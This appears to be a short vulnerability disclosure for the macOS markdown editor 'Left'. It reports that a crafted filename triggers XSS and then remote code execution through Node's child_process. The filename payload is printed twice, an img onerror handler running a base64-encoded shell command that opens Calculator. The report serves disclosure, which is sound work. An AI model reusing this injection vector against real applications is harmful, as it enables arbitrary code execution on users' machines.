| ``` Author: bob11.devranger@gmail.com OS: macOS  Version: 7.1.5  ``` Summary It has been possible to trigger xss and Remote Code Execution via filename Description You can trigger Remote Code Execution using require because the file name generates an XSS. If you name the file `<img src=x onerror=require('child_process').exec('echo$IFS"b3BlbiAtYSAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcA=="|base64$IFS-d|sh')>.md` and open it with Left, the RCE will be triggered.  [macOS] filename `<img src=x onerror=require('child_process').exec('echo$IFS"b3BlbiAtYSAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcA=="|base64$IFS-d|sh')>.md` [image](https://user-images.githubusercontent.com/66944342/201718877-044d3fe8-9630-4186-a04c-b7300c38c2da.png) PoC <https://drive.google.com/file/d/1RgjPqX3rKthP2JlJEtQeqWpYKSi6tb16/view?usp=sharing> What’s More?  * if you have any problems, contact me via [bob11.devranger@gmail.com] * Thank You! |
